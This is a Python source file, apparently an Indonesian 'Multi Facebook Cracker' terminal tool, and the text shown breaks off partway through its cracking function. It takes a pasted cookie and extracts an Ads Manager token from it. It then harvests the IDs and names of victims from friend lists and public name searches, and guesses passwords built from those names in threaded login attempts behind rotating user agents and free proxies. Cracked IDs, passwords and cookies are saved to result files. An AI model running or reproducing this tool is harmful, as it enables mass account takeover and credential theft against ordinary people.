#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as bs

from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns 
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#Ua
usragent=[]
cokbrut=[]
ua=[]
ses=requests.Session()
princp=[]
try:
	
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.prox.txt','r').read().splitlines()
for agenku in range(10000):
 a='Mozilla/5.0 (Linux; Android '
 b=random.choice(['9','10','11','12','13'])
 c='SC-05L Build/ '
 d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/389.0.0.42.111;]'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 
 a='Dalvik/2.1.0 (Linux; U; Android 10.1.1;'
 b=random.choice(['9','10','11','12','13'])
 c='V1965A Build/ZLI36J) '
 d='[FBAN/Orca-Android;FBAV/145.0.0.24.80;FBPN/com.facebook.adsmanager;FBLC/en_US ;FBBV/44430966;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/CPH2459;FBSV/10.1.1;FBCA'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='/ar meabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)

 a='Mozilla/5.0 (Linux; Android '
 b=random.choice(['9','10','11','12','13'])
 c='iCherry C251 Build/MRA58K; wv) '
 d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/537.36'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 
 a='Mozilla/5.0 (BlackBerry; U; '
 b=random.choice(['9','10','11','12','13'])
 c='BlackBerry 9930; en-GB)  '
 d='AppleWebKit/534.11+ (KHTML, seperti Gecko) Versi/'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/534.11+6'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 
 a='Mozilla/5.0 (Linux; Android '
 b=random.choice(['9','10','11','12','13'])
 c='LH9810) '
 d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/537.36'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 
 a='Mozilla/5.0 (Linux; Android 12; '
 b=random.choice(['9','10','11','12','13'])
 c='Redmi Note 12) '
 d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/537.36'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 a='Mozilla/5.0 (BB10; '
 b=random.choice(['9','10','11','12','13'])
 c='Kbd)  '
 d='AppleWebKit/537.35+ (KHTML, seperti Gecko) Versi/'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/537.35+'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
tod=[]
uadia, uadarimu = [],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
j = '\033[38;2;255;127;0;1m' # ORANGE

AK = "[#FF0000]" #"merah"
AC = "[#AF00FF]" #UNGU
AB= "[#FF00FF[" #PINK
AU = "[#00FFFF]" #CYAN
AT = "[#FF8F00]" #ORANGE
ABU = "[#AAAAAA]" #ABU2
acak = random.choice([AK,AC,AB,AU,AT,ABU])
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
	
def Time():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Petang"
	else:timenow = "Selamat Malam"
	return timenow
#------------------[ LOGO-LAKNAT ]-----------------#
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "
def banner():
	clear()
	cetak(nel(f'''[bold red] 

 ____  ____  _  _    __    ____    _  _  ____          
( ___)(_  _)( )/ )  /__\  (  _ \  ( \/ )(  _ \ 
 )__)  _)(_  )  (  /(__)\  )   /   )  (  )(_) )
(__)  (____)(_)\_)(__)(__)(_)\_)  (_/\_)(____/ 

\t\t\t                    ██████████████████████
[bold green]Tools[bold white] : Script Multi Facebook Cracker \t    [bold green]Made [bold white]By Indonesia Coder''',title='[bold green]LOGO',style='bold blue' ))

  #--------------------[ BAGIAN-MASUK ]--------------#
#def audio(text,file):
	#from gtts import gTTS
	#my_a = gTTS(text)
	#my_a.save(file)
	
	
#===========Play_Audio============#
#def play_audio(audio_file):
	#banner()
	#from os import system as cmd
	#try:
		#cmd("play-audio "+audio_file)
	#except:
		#passf
#os.system("clear")
#cetak(nel(f"[b white][[b green]•[b white]] example :  Atsuna , Alvino , Syarif atau nama sendiri",style="b blue"))
#a = input(f"  [{H}•{P}] What is your name : ")
#b = (f" selamat datang di script Atsuna tools")
#audio(b, "test.mp3")
#play_audio("test.mp3")
		
			


#x = "Atsuna"
#y = "123"

#def login1():
	#banner()
	#user = input(f"[{H} • {P}] masukan username :{asu} {P}")
	#pw = input(f"[{H} •{P} ] masukan password : ")
	#if user ==x and pw ==y:
		#print (f"{H}Acces Grented{P}")
		#time.sleep(2)
		#os.system("clear")
		#banner()
	#else:
		#print (f"{m}Acces Denied{P}")
		#time.sleep(2)
		#os.system("clear")
		#back()


	
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name,birthday&access_token='+tokenku[0], cookies={'cookie':cok})
			NAME = json.loads(sy.text)['name']
			ID = json.loads(sy.text)['id']
			#sy3 = json.loads(sy.text)['birthday']
			menu(NAME,ID)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()

		
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\r[b white]Selamat Datang di Script[b red] FIKAR[b white] Tools,Apabila Ada Kesalahan Segera Hubungin Pemilik Script[b red] FIKAR[b white] Tools ,Silahkan Kalian Login Menggunakan Cookies Dan Apabila Gagal Maka Ganti [b green]Cookies[b white] Yg Lain ',style="b blue",title="[b green]Login Cookies[b white]"))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f' └─[{h}•{P}] Masukkan Cookies :{asu} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
		login()
	except Exception as e:
		print(" Cookies Invalid bro")
		os.system('rm -rf .tok.txt && rm -rf .cok.txt')
		print(e)
		time.sleep(0.2)
		back()
#------------------[ BAGIAN-MENU ]----------------#
def menu(NAME,ID):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	lup = []
	lup.append(nel(f"[bold white][[bold magenta]+[bold white]] NAME[bold white]  : {NAME}\n[[bold magenta]+[bold white]] ID [bold white]   : {ID}\n[[bold magenta]+[bold white]] AUTH[bold white]  : AL-VINO.ADIJAYA",width=37,style="bold blue"))
	lup.append(nel(f"[bold white][[bold magenta]+[bold white]] COUNTRY [bold white]: {CN}\n[[bold magenta]+[bold white]] IP[bold white]      : {IP}\n[[bold magenta]+[bold white]] TANGGAL[bold white] : {tgl} {bln} {thn}",width=38,style="bold blue"))
	CON.print(Columns(lup))
	cetak(nel(f'[bold white][[bold green]1[bold white]].CRACK PUBLICK  \t   \t                 [[bold green]2[bold white]].CRACK MASSAL \n[[bold green]3[bold white]].HASIL CRACK   \t                         [[bold green]4[bold white]].CEK TAP YES\t[[bold red]0[bold white]].KELUAR \t \t \t                 [[b green]5[b white]].CRACK NAMA',title='[bold green]MENU CRACK',style='bold blue'))
	_____alvino__adijaya_____ = input('  └─[ PILIH ] : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		dump_publik()
	elif _____alvino__adijaya_____ in ['4']:
		file_cp()
	elif _____alvino__adijaya_____ in ['3']:
		result()
	elif _____alvino__adijaya_____ in ['5','05']:
		nama()
	elif _____alvino__adijaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def nama():
	cetak(nel(f"[b white]masukan nama target, gunakan tanda (,) koma jika ingin lebih dari 1 nama",padding=(0,2),style=f"bold blue"))
	nama = []
	custom = [" xyz"," xd"," muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya"," kirana"]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak ","kirana "]
	nam = input(f' {H} • {P} masukan nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(dump_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()

def dump_nama(url_nama):
	r = bs(ses.get(str(url_nama)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	try:
		url_nama = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(url_nama):
			print(f'\r  [{H}•{P}] sedang dump {asu}%s{P} id'%(len(id)),end=" ")
			sys.stdout.flush()
			cari_nama(url_nama)
	except:pass

#-----------------[ HASIL-CRACK ]-----------------#
def result():
	atsu = []
	suna = []
	suna.append(nel('[b white][[b green]1[b white]] \t    Hasil CP Anda ',width=37,style="b blue"))
	suna.append(nel('[b white][[b green]2[b white]] \t    Hasil OK Anda ',width=38,style="b blue"))
	CON.print(Columns(suna))
	kz = input(f'  └─[{M}Pilih{P}] : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					atsu.append(nel(f"[b white][[b red]0{cih}[b white]]",width=10,title=f"[b green]nomer",style=f"b blue"))
					atsu.append(nel(f"[b white]   {isi}[b white]",width=35,title=f"[b green]tanggal",style=f"b blue"))
					atsu.append(nel(f"[b white]  {len(hem)} Account",width=28,title=f"[b green]total akun",style=f"b blue"))
					CON.print(Columns(atsu))
					#print(Panel('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x))
				else:
					lol.update({str(cih):str(isi)})
					atsu.append(nel(f"[b white][[b red]0{cih}[b white]]",width=10,title=f"[b green]nomer",style=f"b blue"))
					atsu.append(nel(f"[b white]   {isi}[b white]",width=35,title=f"[b green]tanggal",style=f"b blue"))
					atsu.append(nel(f"[b white]  {len(hem)} Account",width=28,title=f"[b green]total akun",style=f"b blue"))
					CON.print(Columns(atsu))
			geeh = input(f'  └─[ {M}PILIH {P}] : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		atsu = []
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					atsu.append(nel(f"[b white][[b red]0{cih}[b white]]",width=10,title=f"[b green]nomer",style=f"b blue"))
					atsu.append(nel(f"[b white]   {isi}[b white]",width=35,title=f"[b green]tanggal",style=f"b blue"))
					atsu.append(nel(f"[b white]  {len(hem)} Account",width=28,title=f"[b green]total akun",style=f"b blue"))
					CON.print(Columns(atsu))
					#print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					atsu.append(nel(f"[b white][[b red]0{cih}[b white]]",width=10,title=f"[b green]nomer",style=f"b blue"))
					atsu.append(nel(f"[b white]   {isi}[b white]",width=35,title=f"[b green]tanggal",style=f"b blue"))
					atsu.append(nel(f"[b white]  {len(hem)} Account",width=28,title=f"[b green]total akun",style=f"b blue"))
					CON.print(Columns(atsu))
			geeh = input('\n   └─[ PILIH ]: ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()


#=======dump publik==========#
def dump_massal():
		try:token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
		except IOError:exit()
		__midlane__ = input(f"\n  [{H}√{P}] Id publik : ")
		uid.append(__midlane__)
		for __colmek__ in uid:
			try:
				session = requests.Session()
				get_id = session.get(f'https://graph.facebook.com/v15.0/{__colmek__ }?fields=name,friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
				peler = get_id["name"]
				for xyz in get_id['friends']['data']:
					try:
						__data__ = (xyz['id']+'|'+xyz['name'])
						if __data__ in id:pass
						else:id.append(__data__)
					except:continue
			except (KeyError,IOError):exit(f"{P}!. Id private/tidak memiliki teman")
			try:
				cetak(nel(f"[bold white][[bold green]√[bold white]] Target name : [bold green]{peler}[bold white]\n[[bold green]√[bold white]] Jumlah [bold green]{str(len(id))}[bold white] id",style='bold blue'))
				setting()
			except requests.exceptions.ConnectionError:
				exit(f"{P}!. Tidak ada koneksi")
				
				
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cetak(nel(f'\t \t[bold white]Pilih Berapa Target Yg Kalian Ingin Crack',title='[bold green]ID MASSAL',style="bold blue"))
		jum = int(input('  └─[ MAU BERAPA TARGET  ] : '))
	except ValueError:
		print(' Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		cetak(nel(f'\t \t[bold white]Masukan Id Target Yg Publik Bukan Yg Privat',title='[bold green]ID',style="bold blue"))
		kl = input('  └─[ MASUKAN ID YANG KE '+str(yz)+' ] : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print(f'  └─[TOTAL ID ]: {h}{P}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()

##-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel(f'[bold white][[b green]1[b white]].CRACK AKUN OLD        [[b green]2[b white]].CRACK AKUN NEW    \t[[b green]3[b white]].CRACK RANDOM ',title='[bold green]MENU PILIHAN',style=' bold blue' ))
	hu = input('  └─[ Pilih ] : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	lupXfla = []
	lupXfla.append(nel(f'\r[bold white]    METODE MOBILE',width=25,title=f"[bold red]• [bold green]01 [bold red]•",style=f"bold blue"))
	lupXfla.append(nel(f'\r[bold white]    METODE MOBILEV2',width=24,title=f"[bold red]• [bold green]02 [bold red]•",style=f"bold blue"))
	lupXfla.append(nel(f'\r[bold white]    METODE ASYNC ',width=25,title=f"[bold red]• [bold green]03 [bold red]•",style=f"bold blue"))
	CON.print(Columns(lupXfla))
	lupXfla = []
	lupXfla.append(nel(f'\t[bold white]                       METODE API ',width=80,title=f"[bold red]• [bold green]04 [bold red]•",style=f"bold blue"))
	CON.print(Columns(lupXfla))
	hc = input('  └─[ Pilih ] : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('api')
	else:
		method.append('mobile')
	gw = (f"[bold white]\t \t         Silahkan ketik  ([b green]y[b white]/[b red]t[b white]) ")
	cetak(nel(gw,title=f"[bold green]TAMPILKAN APK TERKAIT[white]",style=" bold blue" ))
	jembot = input(f'  └─[ Pilih ] :  ')
	if jembot in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	elif jembot in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')

	
	atsuna = (f"[bold white]\t \t         Silahkan Ketik ([b green]y[b white]/[b red]t[b white])")
	cetak(nel(atsuna,title=f"[b green]GANTI USER AGENTS[b white]",style="bold blue"))
	ua = input(f'   └─[ Pilih ] : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'   └─[{H}Input your user agent{P}]: {asu}{P}');uadia.append(bz)
	else:uadarimu.append('uasc')
#	pwplus=input('[+].TAMBAHKAN PASSWORD MANUAL ( Y/t ) ')
#	if pwplus in ['y','Y']:
#		pwpluss.append('ya')
#		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
#		pwku=input('>> Masukkan Password Tambahan : ')
#		pwkuh=pwku.split(',')
#		for xpw in pwkuh:
#			pwnya.append(xpw)
#	else:
#		pwpluss.append('no')
	passwrd()
def warning():
	
	cetak(nel(f"[bold white]Apabila tidak ada hasil maka main kan ([bold red]mode pesawat[bold white]) selama proses crack berjalan",style="bold blue",title="[bold green]Warning[bold white]"))
def tampung():
	lupXfla = []
	lupXfla.append(nel(f'\r[bold green]     {okc} ',width=37,title=f"[bold white] Result [bold white]",style=f"bold blue"))
	lupXfla.append(nel(f'\r[bold yellow]     {cpc} ',width=38,title=f"[bold white] Result [bold white]",style=f"bold blue"))
	CON.print(Columns(lupXfla))
	
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	clear();banner()
	tampung()
	warning()
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=15) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'touch' in method:
					pool.submit(crackasync,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		print('')
		cetak('- Sucses Cracked %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
		print('')
		
#--------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}Atsuna1{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
	prog.advance(des)
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 